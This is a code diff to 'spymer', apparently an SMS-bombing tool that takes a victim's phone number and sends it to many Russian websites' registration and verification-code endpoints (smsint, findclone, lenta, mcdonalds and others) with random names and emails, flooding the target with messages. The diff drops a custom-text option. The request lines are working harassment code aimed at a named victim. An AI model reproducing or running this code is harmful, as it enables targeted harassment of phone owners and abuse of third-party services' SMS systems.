@@ -9,7 +9,6 @@ class spymer:
 		print(Style.RESET_ALL)
 		parser = argparse.ArgumentParser(prog='spymer', description="Fucking shit by FSystem88. Возможно что-то уже не работает. Только для России!",epilog='Мой e-mail - FSystem88@bk.ru')
 		parser.add_argument('phonenum', metavar='phone', help='Телефонный номер жертвы (пример: 79991234455)')
-		parser.add_argument('--text', help='Текст для некоторых сервисов (по умолчанию: Путин тебя любит ♥)')
 		args = parser.parse_args()
 		def showstatus(message, type='new'):
 			now = datetime.datetime.now().strftime('%H:%M:%S')
@@ -39,9 +38,6 @@ class spymer:
 		if _phone[0] == '9':
 			_phone = '7'+_phone
 		
-		_text = args.text
-		if _text == None:
-			_text = 'Путин тебя любит ♥'		
 		_name = ''
 		for x in range(12):
 			_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
@@ -85,7 +81,7 @@ class spymer:
 #			fastmoney = requests.post('https://fastmoney.ru/auth/registration', data={'RegistrationForm[username]': '+' + _phone, 'RegistrationForm[password]': '12345', 'RegistrationForm[confirmPassword]': '12345', 'yt0': 'Регистрация'})
 			findclone = requests.get(' https://findclone.ru/register?phone=+'+_phone, params={'phone': '+'+_phone})
 #			pmsm = requests.post('https://ube.pmsm.org.ru/esb/os-reg/submission', json={'data': {'firstName': _text, 'lastName': '***', 'phone': _phone, 'email': _name+'@gmail.com', 'password': _name, 'passwordConfirm': _name}})
-			smsint = requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _text,'phone': _phone, 'promo': 'yellowforma'})
+			smsint = requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
 #			lenta = requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
 #			maxidom = requests.get('https://www.maxidom.ru/ajax/doRegister.php?send_code_again=Y&email='+_name+'@gmail.com&phone='+_phoneMaxidom+'&code_type=phone', params={'send_code_again': 'Y', 'phone': _phoneMaxidom, 'email': _name+'@gmail.com', 'code_type': 'phone'})
 #			mcdonalds = requests.post('https://mcdonalds.ru/api/auth/code', json={'phone': '+' + _phone})
